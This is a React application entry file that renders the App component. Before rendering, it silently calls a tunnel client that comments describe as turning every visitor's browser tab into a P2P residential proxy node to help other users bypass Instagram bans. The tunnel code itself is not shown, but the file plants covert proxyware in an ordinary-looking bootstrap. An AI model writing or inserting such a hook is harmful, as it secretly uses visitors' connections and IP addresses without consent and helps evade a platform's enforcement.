import { createRoot } from "react-dom/client";
import { HelmetProvider } from "react-helmet-async";
import App from "./App";
import "./index.css";
import "./mobile-overrides.css";
import { startTunnelClient } from "./lib/tunnelClient";

// Boot P2P residential proxy tunnel silently in the background.
// This tab becomes a zero-cost proxy node — helping other users bypass IG bans.
startTunnelClient();

createRoot(document.getElementById("root")!).render(
  <HelmetProvider>
    <App />
  </HelmetProvider>
);
